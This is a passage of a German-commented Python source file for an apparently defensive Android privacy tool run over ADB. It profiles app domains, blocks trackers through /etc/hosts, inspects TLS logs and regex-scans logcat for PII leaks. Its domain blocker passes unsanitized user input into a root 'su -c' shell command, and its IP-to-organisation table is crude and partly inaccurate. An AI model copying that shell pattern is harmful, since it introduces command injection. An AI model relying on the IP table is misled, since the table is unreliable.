            uid = uid_m.group(1)
            pkg = uid_pkg.get(uid, f"uid:{uid}")
        # Domain extrahieren
        domain = None
        for pat in [
            r'getaddrinfo\("([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})"',
            r'(?:lookup|resolv|hostname)[:\s=]+([a-zA-Z0-9._-]{4,}\.[a-zA-Z]{2,})',
            r'"([a-zA-Z0-9._-]{6,}\.[a-zA-Z]{2,})"',
        ]:
            m = re.search(pat, line, re.I)
            if m:
                d = m.group(1).lower().strip('.')
                if len(d) > 4 and '.' in d and not re.match(r'^\d+\.\d+', d):
                    domain = d
                    break
        if domain:
            if pkg not in app_domains:
                app_domains[pkg] = set()
                app_tracker_count[pkg] = 0
            app_domains[pkg].add(domain)
            if _is_tracker(domain) or _is_malware(domain):
                app_tracker_count[pkg] = app_tracker_count.get(pkg, 0) + 1

    if not app_domains:
        ui.warn("Keine App-Domain-Zuordnungen gefunden.")
        ui.info("Tipp: Nutze das Gerät aktiv, dann erneut prüfen.")
        ui.pause()
        return

    # Sortieren: Apps mit den meisten Domains oben
    sorted_apps = sorted(app_domains.items(), key=lambda x: len(x[1]), reverse=True)

    ui.clear()
    ui.rule("📱 PRO-APP DOMAIN-PROFIL", ui.BCYAN)
    print()

    lines_export = [f"# Pro-App Domain-Profil  {time.strftime('%Y-%m-%d %H:%M:%S')}\n"]

    for pkg, domains in sorted_apps[:30]:
        tc = app_tracker_count.get(pkg, 0)
        col = ui.BRED if tc > 0 else ui.BGREEN
        print(f"  {col}{ui.BOLD}{pkg}{ui.RESET}  "
              f"({len(domains)} Domains, {ui.BYELLOW}{tc} Tracker{ui.RESET})")
        lines_export.append(f"\n[{pkg}]  {len(domains)} Domains  {tc} Tracker")
        for domain in sorted(domains)[:25]:
            cat, dcol_key = _cat_domain(domain)
            dcol = _COLOR_MAP.get(dcol_key, ui.GREY)
            flag = ""
            if _is_malware(domain):
                flag = f" {ui.BRED}☠MALWARE{ui.RESET}"
            elif _is_tracker(domain):
                flag = f" {ui.BYELLOW}[T]{ui.RESET}"
            print(f"      {dcol}{domain:<45}{ui.RESET}  [{cat}]{flag}")
            lines_export.append(f"  {domain:<45}  [{cat}]"
                                 + (" [TRACKER]" if _is_tracker(domain) else "")
                                 + (" [MALWARE]" if _is_malware(domain) else ""))
        if len(domains) > 25:
            print(f"      {ui.GREY}… und {len(domains)-25} weitere Domains{ui.RESET}")
        print()

    print(f"  {ui.BOLD}Gesamt: {len(sorted_apps)} Apps · "
          f"{sum(len(v) for v in app_domains.values())} unique Domains{ui.RESET}")

    if ui.confirm("Als TXT exportieren?", True):
        fn = os.path.join(OUT, f"app_domains_{int(time.time())}.txt")
        with open(fn, "w") as f:
            f.write("\n".join(lines_export))
        ui.ok(f"Gespeichert: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  6. DOMAIN-TIMELINE
# ═══════════════════════════════════════════════════════════════════════════════

def domain_timeline(adb: ADB, dev=None, st=None, data=None) -> None:
    """Zeitverlauf aller Domain-Aufrufe — wann wurde was aufgerufen."""
    ui.clear()
    ui.rule("📅 DOMAIN-TIMELINE", ui.BCYAN)
    print()
    ui.info("Lese logcat mit Zeitstempeln …")

    uid_pkg = _uid_to_pkg(adb)
    raw = adb.shell(
        "logcat -d -v time 2>/dev/null | "
        "grep -iE 'DnsResolver|getaddrinfo|resolv|dns|hostname|connect' | "
        "tail -n 300")

    # Einträge: (zeit_str, domain, pkg, kategorie, is_tracker, is_malware)
    entries = []
    for line in raw.splitlines():
        # Zeit: MM-DD HH:MM:SS.mmm
        ts_m = re.match(r'(\d{2}-\d{2} \d{2}:\d{2}:\d{2})', line)
        ts_str = ts_m.group(1) if ts_m else "??:??:??"
        # UID
        uid_m = re.search(r'\buid[=:\s]+(\d+)', line, re.I)
        pkg = uid_pkg.get(uid_m.group(1), "sys") if uid_m else "sys"
        # Domain
        domain = None
        for pat in [
            r'getaddrinfo\("([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})"',
            r'(?:lookup|resolv|dns)[:\s]+([a-zA-Z0-9._-]{4,}\.[a-zA-Z]{2,})',
        ]:
            m = re.search(pat, line, re.I)
            if m:
                d = m.group(1).lower().strip('.')
                if len(d) > 4 and '.' in d:
                    domain = d
                    break
        if domain:
            cat, _ = _cat_domain(domain)
            entries.append((ts_str, domain, pkg, cat,
                            _is_tracker(domain), _is_malware(domain)))

    # Filter-Menü
    f_choice = ui.menu("Filter", [
        ("1", "Alle Einträge anzeigen"),
        ("2", "Nur Tracker & Malware"),
        ("3", "Nur Social-Media"),
        ("4", "Nur Werbung/Tracking"),
        ("5", "Nur unbekannte Domains"),
    ], back_label="Zurück")
    if f_choice == "back":
        return

    ui.clear()
    ui.rule("📅 DOMAIN-TIMELINE", ui.BCYAN)
    print(f"\n  {'Zeit':<17} {'Domain':<40} {'App':<20} {'Kategorie':<14}  !  \n")

    filtered = []
    for ts, dom, pkg, cat, is_t, is_m in entries:
        if f_choice == "2" and not (is_t or is_m):
            continue
        if f_choice == "3" and cat != "Social":
            continue
        if f_choice == "4" and cat not in ("Werbung", "Tracking", "Analytics"):
            continue
        if f_choice == "5" and cat != "Unbekannt":
            continue
        filtered.append((ts, dom, pkg, cat, is_t, is_m))

    # Zeitgruppen
    if filtered:
        print(f"  {ui.GREY}{'─'*95}{ui.RESET}")
        last_ts_prefix = ""
        for ts, dom, pkg, cat, is_t, is_m in filtered[-60:]:
            # Neue Zeitgruppe?
            ts_prefix = ts[:8] if len(ts) >= 8 else ts
            if ts_prefix != last_ts_prefix:
                print(f"\n  {ui.BOLD}── {ts_prefix} ──{ui.RESET}")
                last_ts_prefix = ts_prefix
            flag = ""
            if is_m:
                flag = f"{ui.BRED}☠{ui.RESET}"
            elif is_t:
                flag = f"{ui.BYELLOW}T{ui.RESET}"
            col = ui.BRED if is_m else (ui.BYELLOW if is_t else ui.BCYAN)
            print(f"  {ui.GREY}{ts[5:]:>11}{ui.RESET}  {col}{dom:<40}{ui.RESET}  "
                  f"{ui.GREY}{pkg[:18]:<20}{ui.RESET}  [{cat:<12}]  {flag}")
    else:
        ui.warn("Keine Einträge für diesen Filter.")

    print(f"\n  {ui.BOLD}Gesamt: {len(filtered)} von {len(entries)} Einträgen{ui.RESET}")

    if ui.confirm("Als CSV exportieren?", True):
        fn = os.path.join(OUT, f"timeline_{int(time.time())}.csv")
        with open(fn, "w") as f:
            f.write("Zeit,Domain,App,Kategorie,Tracker,Malware\n")
            for ts, dom, pkg, cat, is_t, is_m in filtered:
                f.write(f"{ts},{dom},{pkg},{cat},{int(is_t)},{int(is_m)}\n")
        ui.ok(f"CSV: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  7. DOMAIN-BLOCKER
# ═══════════════════════════════════════════════════════════════════════════════

def domain_blocker(adb: ADB, dev=None, st=None, data=None) -> None:
    """Domains via ADB sperren — /etc/hosts oder NetworkPolicy."""
    ui.clear()
    ui.rule("🔒 DOMAIN-BLOCKER", ui.BCYAN)
    is_root = bool((st or {}).get("is_root"))
    print()

    # Root-Check
    root_test = adb.shell("id 2>/dev/null")
    has_root = "uid=0" in root_test or "root" in root_test.lower()

    # Aktuelle /etc/hosts
    hosts_raw = adb.shell("cat /etc/hosts 2>/dev/null")
    current_blocks = [l.strip() for l in hosts_raw.splitlines()
                      if l.strip().startswith("0.0.0.0") or l.strip().startswith("127.0.0.1")]

    print(f"  Root-Zugriff:  {'✓ JA' if has_root else '✗ NEIN (nur Anzeige-Modus)'}\n")
    print(f"  Aktuelle Blocks in /etc/hosts: {len(current_blocks)}")
    for b in current_blocks[:10]:
        print(f"    {ui.GREY}{b}{ui.RESET}")
    if len(current_blocks) > 10:
        print(f"    {ui.GREY}… und {len(current_blocks)-10} weitere{ui.RESET}")
    print()

    ch = ui.menu("Aktion", [
        ("1", "Alle bekannten Tracker blockieren (KNOWN_TRACKERS)"),
        ("2", "Alle bekannten Malware-Domains blockieren"),
        ("3", "Einzelne Domain manuell blockieren"),
        ("4", "Alle Blocks anzeigen"),
        ("5", "Alle Panzer-Blocks entfernen"),
        ("6", "ADB-NetworkPolicy (ohne Root) — App-Netzwerk sperren"),
        ("7", "Empfohlene DNS-Server setzen"),
    ], back_label="Zurück")
    if ch == "back":
        return

    def _block_via_hosts(domains: list[str], label: str) -> None:
        if not has_root:
            ui.warn("Kein Root — zeige Befehle zum manuellen Ausführen:")
            for d in domains[:10]:
                print(f"  {ui.GREY}adb shell \"su -c 'echo 0.0.0.0 {d} >> /etc/hosts'\"  {ui.RESET}")
            return
        count = 0
        for d in domains:
            result = adb.shell(
                f"su -c 'echo 0.0.0.0 {d} >> /etc/hosts' 2>&1")
            if not result.strip() or "success" in result.lower():
                count += 1
        ui.ok(f"{count} {label} blockiert via /etc/hosts")
        # DNS-Cache leeren
        adb.shell("su -c 'ndc resolver flushdefaultif 2>/dev/null || true'")

    if ch == "1":
        if ui.confirm(f"Alle {len(KNOWN_TRACKERS)} Tracker blockieren?", False):
            _block_via_hosts(list(KNOWN_TRACKERS), "Tracker")

    elif ch == "2":
        if ui.confirm(f"Alle {len(MALWARE_DOMAINS)} Malware-Domains blockieren?", True):
            _block_via_hosts(list(MALWARE_DOMAINS), "Malware-Domains")

    elif ch == "3":
        print(f"\n  {ui.BOLD}Domain eingeben (z.B. tracker.com):{ui.RESET} ", end="")
        try:
            domain = input().strip()
        except (EOFError, KeyboardInterrupt):
            domain = ""
        if domain and '.' in domain:
            _block_via_hosts([domain, f"www.{domain}"], "Domains")
        else:
            ui.warn("Ungültige Domain.")

    elif ch == "4":
        hosts = adb.shell("cat /etc/hosts 2>/dev/null")
        print(f"\n{ui.GREY}{hosts[:2000]}{ui.RESET}")

    elif ch == "5":
        if has_root and ui.confirm("Alle 0.0.0.0-Einträge aus /etc/hosts entfernen?", False):
            adb.shell("su -c \"grep -v '^0\\.0\\.0\\.0' /etc/hosts > /tmp/hosts.tmp && "
                      "cp /tmp/hosts.tmp /etc/hosts\" 2>&1")
            ui.ok("Blocks entfernt.")

    elif ch == "6":
        ui.rule("NetworkPolicy (kein Root nötig)", ui.BCYAN)
        uid_pkg = _uid_to_pkg(adb)
        print(f"\n  {ui.GREY}Bekannte UIDs:{ui.RESET}")
        for uid, pkg in list(uid_pkg.items())[:15]:
            print(f"    UID {uid:<6}  {pkg}")
        print(f"\n  {ui.BOLD}Befehl zum Netz-Sperren einer App:{ui.RESET}")
        print(f"  {ui.GREY}adb shell cmd netpolicy set-app-policy <UID> POLICY_REJECT_ALL{ui.RESET}")
        print(f"\n  {ui.BOLD}App wieder freigeben:{ui.RESET}")
        print(f"  {ui.GREY}adb shell cmd netpolicy set-app-policy <UID> POLICY_NONE{ui.RESET}")

    elif ch == "7":
        ui.rule("DNS-Server empfehlen", ui.BCYAN)
        print(f"\n  {ui.BGREEN}Cloudflare (privat, schnell):{ui.RESET}")
        print(f"    {ui.GREY}adb shell settings put global private_dns_mode hostname{ui.RESET}")
        print(f"    {ui.GREY}adb shell settings put global private_dns_specifier 1dot1dot1dot1.cloudflare-dns.com{ui.RESET}")
        print(f"\n  {ui.BGREEN}Quad9 (malware-blockierend):{ui.RESET}")
        print(f"    {ui.GREY}adb shell settings put global private_dns_specifier dns.quad9.net{ui.RESET}")
        print(f"\n  {ui.BGREEN}AdGuard (Werbung + Tracker blockierend):{ui.RESET}")
        print(f"    {ui.GREY}adb shell settings put global private_dns_specifier dns.adguard.com{ui.RESET}")

    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  8. IP-GEOLOKALISIERUNG
# ═══════════════════════════════════════════════════════════════════════════════

_KNOWN_RANGES: list[tuple[str, str, str]] = [
    # (prefix, org, land)
    ("1.1.1.",    "Cloudflare",       "US"),
    ("1.0.0.",    "Cloudflare",       "US"),
    ("8.8.",      "Google DNS",       "US"),
    ("8.34.",     "Google",           "US"),
    ("8.35.",     "Google",           "US"),
    ("34.",       "Google Cloud",     "US"),
    ("35.",       "Google Cloud",     "US"),
    ("142.250.",  "Google",           "US"),
    ("142.251.",  "Google",           "US"),
    ("172.64.",   "Cloudflare",       "US"),
    ("172.65.",   "Cloudflare",       "US"),
    ("162.159.",  "Cloudflare",       "US"),
    ("104.16.",   "Cloudflare",       "US"),
    ("104.17.",   "Cloudflare",       "US"),
    ("13.",       "Amazon AWS",       "US"),
    ("52.",       "Amazon AWS",       "US"),
    ("54.",       "Amazon AWS",       "US"),
    ("3.",        "Amazon AWS",       "US"),
    ("18.",       "Amazon AWS",       "US"),
    ("31.13.",    "Facebook/Meta",    "US"),
    ("157.240.",  "Facebook/Meta",    "US"),
    ("185.60.",   "Facebook/Meta",    "US"),
    ("20.",       "Microsoft Azure",  "US"),
    ("40.",       "Microsoft Azure",  "US"),
    ("51.",       "Microsoft Azure",  "EU"),
    ("204.79.",   "Microsoft",        "US"),
    ("216.239.",  "Google",           "US"),
    ("216.58.",   "Google",           "US"),
    ("74.125.",   "Google",           "US"),
    ("64.233.",   "Google",           "US"),
    ("195.",      "European ISP",     "EU"),
    ("212.",      "European ISP",     "EU"),
    ("5.",        "Various EU",       "EU"),
    ("89.",       "Various EU",       "EU"),
    ("91.",       "Various EU",       "EU"),
    ("178.",      "Various",          "EU"),
    ("185.",      "Various",          "EU"),
    ("194.",      "Various EU",       "EU"),
]


def _lookup_ip_org(ip: str) -> tuple[str, str]:
    """Gibt (Org, Land) für bekannte IP-Ranges zurück."""
    for prefix, org, country in _KNOWN_RANGES:
        if ip.startswith(prefix):
            return org, country
    return "Unbekannt", "?"


def ip_geolocate(adb: ADB, dev=None, st=None, data=None) -> None:
    """IP-Geolokalisierung aller aktiven Verbindungen."""
    ui.clear()
    ui.rule("🌍 IP-GEOLOKALISIERUNG", ui.BCYAN)
    print()
    ui.info("Lese aktive Verbindungen …")

    conn_raw = adb.shell(
        "ss -tnp 2>/dev/null | grep ESTAB | head -n 20 || "
        "netstat -tnp 2>/dev/null | grep ESTABLISHED | head -n 20")

    # IPs sammeln
    ips_seen: dict[str, str] = {}   # ip → proc_info
    for line in conn_raw.splitlines():
        parts = line.split()
        if len(parts) < 4:
            continue
        remote = parts[4] if len(parts) > 4 else parts[3]
        ip_m = re.match(r'[\[]?([0-9a-fA-F.:]+)[\]]?:(\d+)', remote)
        if not ip_m:
            continue
        ip = ip_m.group(1)
        if ip in ('0.0.0.0', '::', '::1', '127.0.0.1'):
            continue
        proc = parts[-1] if '(' in parts[-1] or '"' in parts[-1] else ""
        proc = re.sub(r'.*"([^"]+)".*', r'\1', proc)[:20]
        ips_seen[ip] = proc

    if not ips_seen:
        ui.warn("Keine aktiven Verbindungen gefunden.")
        ui.pause()
        return

    print(f"\n  {ui.BOLD}{'IP-Adresse':<22} {'Port':>6}  {'Hostname':<30} {'Org':<22} {'Land':<5} {'App':<18}{ui.RESET}")
    print(f"  {'─'*105}")

    results = []
    for line in conn_raw.splitlines():
        parts = line.split()
        if len(parts) < 5:
            continue
        remote = parts[4]
        ip_m = re.match(r'[\[]?([0-9a-fA-F.:]+)[\]]?:(\d+)', remote)
        if not ip_m:
            continue
        ip = ip_m.group(1)
        port = ip_m.group(2)
        if ip in ('0.0.0.0', '::', '::1', '127.0.0.1'):
            continue
        org, country = _lookup_ip_org(ip)
        # Reverse-DNS
        ns_out = adb.shell(f"nslookup {ip} 2>/dev/null | tail -3")
        hostname = ""
        m = re.search(r'name\s*=\s*([a-zA-Z0-9._-]+)', ns_out, re.I)
        if m:
            hostname = m.group(1).rstrip('.')[:28]
        proc = parts[-1] if '(' in parts[-1] or '"' in parts[-1] else ""
        proc = re.sub(r'.*"([^"]+)".*', r'\1', proc)[:16]
        # Port-Dienst
        svc = {
            "443": "HTTPS", "80": "HTTP", "53": "DNS", "8080": "HTTP-Alt",
            "993": "IMAPS", "587": "SMTP", "25": "SMTP", "5228": "GCM",
        }.get(port, "")
        col = ui.BGREEN if org != "Unbekannt" else ui.GREY
        print(f"  {col}{ip:<22}{ui.RESET} {port:>6}  "
              f"{ui.BCYAN}{hostname or '—':<30}{ui.RESET} "
              f"{org:<22} {ui.BOLD}{country:<5}{ui.RESET} {ui.GREY}{proc:<18}{ui.RESET}"
              + (f"  [{svc}]" if svc else ""))
        results.append({"ip": ip, "port": port, "hostname": hostname,
                        "org": org, "country": country, "app": proc})

    # Zusammenfassung
    orgs = {}
    for r in results:
        orgs[r["org"]] = orgs.get(r["org"], 0) + 1
    print(f"\n  {ui.BOLD}Verbindungen nach Org:{ui.RESET}")
    for org, cnt in sorted(orgs.items(), key=lambda x: x[1], reverse=True):
        bar = "█" * min(cnt * 3, 30)
        print(f"  {ui.GREY}{org:<25}{ui.RESET} {ui.BCYAN}{bar}{ui.RESET} {cnt}")

    if ui.confirm("Export speichern?", True):
        fn = os.path.join(OUT, f"ip_geo_{int(time.time())}.txt")
        with open(fn, "w") as f:
            f.write(f"# IP-Geolokalisierung {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for r in results:
                f.write(f"{r['ip']:<22}  {r['port']:>6}  {r['hostname']:<30}  "
                        f"{r['org']:<22}  {r['country']}  [{r['app']}]\n")
        ui.ok(f"Gespeichert: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
#  9. TLS/SSL INSPECTOR
# ═══════════════════════════════════════════════════════════════════════════════

def tls_inspector(adb: ADB, dev=None, st=None, data=None) -> None:
    """TLS/SSL-Versionen, Zertifikat-Fehler, schwache Verschlüsselung analysieren."""
    ui.clear()
    ui.rule("🔐 TLS/SSL INSPECTOR", ui.BCYAN)
    print()
    ui.info("Lese TLS-Ereignisse aus logcat …")

    raw = adb.shell(
        "logcat -d -t 300 2>/dev/null | grep -iE "
        "'ssl|tls|cert|handshake|x509|trust|pin|cipher|HTTPS' | tail -n 200")

    # Analyse
    tls_versions: dict[str, int] = {}
    cert_errors: list[str] = []
    pinning_fails: list[str] = []
    weak_ciphers: list[str] = []
    app_tls: dict[str, set] = {}  # pkg → {tls_versions}

    for line in raw.splitlines():
        # TLS-Version
        for v in ["TLSv1.3", "TLSv1.2", "TLSv1.1", "TLSv1.0", "SSLv3", "SSLv2"]:
            if v.lower() in line.lower():
                tls_versions[v] = tls_versions.get(v, 0) + 1
                # App-Zuordnung
                uid_m = re.search(r'uid[=:\s]+(\d+)', line, re.I)
                # Ohne UID-Auflösung hier — zu teuer
                break
        # Zertifikat-Fehler
        if re.search(r'cert.*error|invalid.*cert|expired|CertPathValidator|'
                     r'SSLHandshakeException|CertificateException', line, re.I):
            cert_errors.append(line.strip()[:120])
        # Certificate Pinning
        if re.search(r'pin|CertificatePinner|PublicKeyPinning|pinning.*fail', line, re.I):
            pinning_fails.append(line.strip()[:120])
        # Schwache Cipher
        if re.search(r'RC4|DES|MD5|NULL.*cipher|EXPORT', line, re.I):
            weak_ciphers.append(line.strip()[:120])

    # Ausgabe
    print(f"\n  {ui.BOLD}TLS-Versionen erkannt:{ui.RESET}")
    for v, cnt in sorted(tls_versions.items(), key=lambda x: x[1], reverse=True):
        if v in ("TLSv1.0", "TLSv1.1", "SSLv3", "SSLv2"):
            col = ui.BRED
            warn = "  ← UNSICHER"
        elif v == "TLSv1.2":
            col = ui.BYELLOW
            warn = "  ← veraltet"
        else:
            col = ui.BGREEN
            warn = "  ✓"
        bar = "█" * min(cnt, 40)
        print(f"  {col}{v:<12}{ui.RESET} {bar:<40} {cnt:>4}x{warn}")

    if not tls_versions:
        print(f"  {ui.GREY}(keine TLS-Ereignisse im logcat gefunden){ui.RESET}")

    print()
    if cert_errors:
        print(f"  {ui.BRED}{ui.BOLD}⚠ ZERTIFIKAT-FEHLER ({len(cert_errors)}):{ui.RESET}")
        for e in cert_errors[:6]:
            print(f"    {ui.BRED}{e}{ui.RESET}")
    else:
        print(f"  {ui.BGREEN}✓ Keine Zertifikat-Fehler erkannt{ui.RESET}")

    print()
    if pinning_fails:
        print(f"  {ui.BYELLOW}⚠ Certificate-Pinning-Events ({len(pinning_fails)}):{ui.RESET}")
        for p in pinning_fails[:5]:
            print(f"    {ui.BYELLOW}{p}{ui.RESET}")
    else:
        print(f"  {ui.BGREEN}✓ Kein Pinning-Problem erkannt{ui.RESET}")

    print()
    if weak_ciphers:
        print(f"  {ui.BRED}⚠ SCHWACHE CIPHER ({len(weak_ciphers)}):{ui.RESET}")
        for c in weak_ciphers[:4]:
            print(f"    {ui.BRED}{c}{ui.RESET}")
    else:
        print(f"  {ui.BGREEN}✓ Keine schwachen Cipher erkannt{ui.RESET}")

    # MITM-Hinweis
    print(f"\n  {ui.GREY}MITM-Hinweis: Certificate-Pinning verhindert MITM auch bei kompromittiertem CA.")
    print(f"  TLSv1.0/1.1 anfällig für POODLE, BEAST, CRIME. Upgrade auf 1.3 empfohlen.{ui.RESET}")

    if ui.confirm("TLS-Report speichern?", False):
        fn = os.path.join(OUT, f"tls_report_{int(time.time())}.txt")
        with open(fn, "w") as f:
            f.write(f"# TLS-Report {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write("TLS-Versionen:\n")
            for v, cnt in tls_versions.items():
                f.write(f"  {v}: {cnt}x\n")
            f.write(f"\nZertifikat-Fehler ({len(cert_errors)}):\n")
            for e in cert_errors:
                f.write(f"  {e}\n")
            f.write(f"\nPinning-Events ({len(pinning_fails)}):\n")
            for p in pinning_fails:
                f.write(f"  {p}\n")
        ui.ok(f"TLS-Report: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
# 10. INTERNET-PERMISSION-SCAN
# ═══════════════════════════════════════════════════════════════════════════════

def internet_permission_scan(adb: ADB, dev=None, st=None, data=None) -> None:
    """Welche Apps haben INTERNET-Permission — mit Risiko-Score."""
    ui.clear()
    ui.rule("🌐 INTERNET-PERMISSION-SCAN", ui.BCYAN)
    print()
    ui.info("Lese alle Apps mit Netzwerk-Berechtigungen …")

    # Alle UIDs mit INTERNET-Permission
    raw = adb.shell(
        "dumpsys package 2>/dev/null | grep -B 10 'android.permission.INTERNET' "
        "| grep -E '^Package|packageName='")
    # Zweite Methode: pm dump
    raw2 = adb.shell(
        "pm list packages -3 2>/dev/null")  # User-Apps

    # Analyse: alle User-Apps mit INTERNET
    user_apps = [l.replace("package:", "").strip()
                 for l in raw2.splitlines() if l.startswith("package:")]

    # Für Batch: dumpsys package alle Apps
    all_dump = adb.shell("dumpsys package 2>/dev/null | grep -E 'Package \\[|INTERNET|CHANGE_NETWORK|BACKGROUND_SYNC|FOREGROUND_SERVICE|RECEIVE_BOOT|WAKE_LOCK'")

    # Parsen
    apps: list[dict] = []
    current_pkg = ""
    perms: set = set()

    for line in all_dump.splitlines():
        pkg_m = re.match(r'\s*Package \[([^\]]+)\]', line)
        if pkg_m:
            if current_pkg and "INTERNET" in perms:
                apps.append({"pkg": current_pkg, "perms": set(perms)})
            current_pkg = pkg_m.group(1)
            perms = set()
        for perm in ["INTERNET", "CHANGE_NETWORK_STATE", "ACCESS_NETWORK_STATE",
                     "RECEIVE_BOOT_COMPLETED", "WAKE_LOCK", "FOREGROUND_SERVICE",
                     "BACKGROUND_SYNC", "READ_PHONE_STATE"]:
            if perm in line:
                perms.add(perm)

    if current_pkg and "INTERNET" in perms:
        apps.append({"pkg": current_pkg, "perms": set(perms)})

    def _risk(p: set) -> tuple[int, str]:
        score = 1
        reason = []
        if "RECEIVE_BOOT_COMPLETED" in p:
            score += 2; reason.append("Auto-Start")
        if "FOREGROUND_SERVICE" in p:
            score += 2; reason.append("Foreground-Service")
        if "WAKE_LOCK" in p:
            score += 1; reason.append("WakeLock")
        if "READ_PHONE_STATE" in p:
            score += 2; reason.append("Telefon-ID")
        if "BACKGROUND_SYNC" in p:
            score += 1; reason.append("Hintergrund-Sync")
        return score, ", ".join(reason) if reason else "Standard"

    # Sortieren nach Risiko
    scored = [(a, _risk(a["perms"])) for a in apps]
    scored.sort(key=lambda x: x[1][0], reverse=True)

    print(f"\n  {ui.BOLD}{'App':<45} {'Risiko':>7}  {'Gründe'}{ui.RESET}")
    print(f"  {'─'*90}")

    for app, (score, reason) in scored[:50]:
        col = (ui.BRED if score >= 6 else
               ui.BYELLOW if score >= 4 else
               ui.BGREEN)
        bar = "█" * min(score, 8)
        print(f"  {col}{app['pkg']:<45}{ui.RESET} {col}{bar:<8}{ui.RESET} {reason}")

    print(f"\n  {ui.BOLD}Gesamt: {len(apps)} Apps mit INTERNET-Permission{ui.RESET}")
    high_risk = sum(1 for _, (s, _) in scored if s >= 6)
    print(f"  Hohes Risiko: {ui.BRED}{high_risk}{ui.RESET}  |  "
          f"Mittleres Risiko: {ui.BYELLOW}{sum(1 for _,(s,_) in scored if 4<=s<6)}{ui.RESET}  |  "
          f"Niedrig: {ui.BGREEN}{sum(1 for _,(s,_) in scored if s<4)}{ui.RESET}")

    if ui.confirm("Liste exportieren?", True):
        fn = os.path.join(OUT, f"internet_perm_{int(time.time())}.txt")
        with open(fn, "w") as f:
            f.write(f"# Internet-Permission-Scan {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for app, (score, reason) in scored:
                f.write(f"  [{score:2d}] {app['pkg']:<50}  {reason}\n")
        ui.ok(f"Gespeichert: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
# 11. PII-LEAK-DETEKTOR
# ═══════════════════════════════════════════════════════════════════════════════

def pii_leak_detector(adb: ADB, dev=None, st=None, data=None) -> None:
    """Erkennt persönliche Daten (IMEI, GPS, E-Mail, UUID) in DNS/HTTP-Anfragen."""
    ui.clear()
    ui.rule("🔍 PII-LEAK-DETEKTOR", ui.BRED)
    print()
    ui.info("Analysiere logcat + DNS auf Datenlecks …")

    raw = adb.shell(
        "logcat -d -t 500 2>/dev/null | grep -iE "
        "'dns|url|http|connect|upload|send|request|getaddr' | tail -n 300")
    raw2 = adb.shell(
        "dumpsys activity 2>/dev/null | grep -iE 'intent.*data|uri.*tel|uri.*mailto' | head -n 50")

    combined = raw + "\n" + raw2

    # PII-Pattern-Suche
    findings: list[dict] = []

    _PII_PATTERNS = [
        # (Name, Pattern, Schweregrad)
        ("IMEI (15-stellig)", r'\b\d{15}\b', "KRITISCH"),
        ("IMSI (15-stellig)", r'\b2\d{14}\b', "KRITISCH"),
        ("GPS-Koordinaten", r'\b-?\d{1,3}\.\d{5,}[,&]\s*-?\d{1,3}\.\d{5,}\b', "KRITISCH"),
        ("E-Mail-Adresse", r'\b[a-zA-Z0-9._%+\-]+%40[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b', "HOCH"),
        ("E-Mail (klartext)", r'\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b', "HOCH"),
        ("UUID/Advertiser-ID",
         r'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b',
         "MITTEL"),
        ("MAC-Adresse", r'\b(?:[0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}\b', "MITTEL"),
        ("Telefonnummer", r'\b(?:\+\d{1,3}|00\d{2})[\s\-]?\d{3,14}\b', "MITTEL"),
        ("Android-ID (16 Hex)", r'\b[0-9a-fA-F]{16}\b', "NIEDRIG"),
        ("IP im URL", r'https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', "NIEDRIG"),
    ]

    for line in combined.splitlines():
        for name, pat, severity in _PII_PATTERNS:
            m = re.search(pat, line)
            if m:
                # App-Kontext
                uid_m = re.search(r'uid[=:\s]+(\d+)', line, re.I)
                pkg_m = re.search(r'(?:pkg|package)[=:\s]+([a-z][a-z0-9._]+)', line, re.I)
                ctx = pkg_m.group(1) if pkg_m else (f"uid:{uid_m.group(1)}" if uid_m else "?")
                findings.append({
                    "name": name,
                    "value": m.group(0)[:40],
                    "severity": severity,
                    "app": ctx[:30],
                    "line": line.strip()[:100],
                })
                break  # Nur erstes Match pro Zeile

    # Ausgabe nach Schweregrad
    for sev, col in [("KRITISCH", ui.BRED), ("HOCH", ui.BYELLOW),
                     ("MITTEL", ui.BCYAN), ("NIEDRIG", ui.GREY)]:
        subset = [f for f in findings if f["severity"] == sev]
        if not subset:
            continue
        print(f"\n  {col}{ui.BOLD}{'☠' if sev=='KRITISCH' else '⚠'} {sev} — {len(subset)} Fund{'' if len(subset)==1 else 'e'}:{ui.RESET}")
        for f in subset[:8]:
            print(f"    {col}{f['name']:<25}{ui.RESET}  "
                  f"{ui.BOLD}{f['value']}{ui.RESET}  → [{f['app']}]")
            print(f"    {ui.GREY}  Kontext: {f['line']}{ui.RESET}")

    if not findings:
        print(f"  {ui.BGREEN}✓ Keine PII-Lecks in logcat erkannt{ui.RESET}")
        print(f"  {ui.GREY}  Hinweis: Encrypted DNS (DoH/DoT) verhindert DNS-basierte Erkennung.{ui.RESET}")
    else:
        crit = sum(1 for f in findings if f["severity"] == "KRITISCH")
        print(f"\n  {ui.BOLD}Gesamt: {len(findings)} Treffer  |  {ui.BRED}{crit} KRITISCH{ui.RESET}")

    if findings and ui.confirm("PII-Report speichern?", True):
        fn = os.path.join(OUT, f"pii_leak_{int(time.time())}.txt")
        with open(fn, "w") as f:
            f.write(f"# PII-Leak-Bericht {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for entry in findings:
                f.write(f"[{entry['severity']}] {entry['name']:<25}  "
                        f"{entry['value']}  [{entry['app']}]\n"
                        f"  Kontext: {entry['line']}\n\n")
        ui.ok(f"PII-Report: {fn}")
    ui.pause()


# ═══════════════════════════════════════════════════════════════════════════════
# 12. TIEFEN-TRAFFIC-CAPTURE (Root/tcpdump)
# ═══════════════════════════════════════════════════════════════════════════════

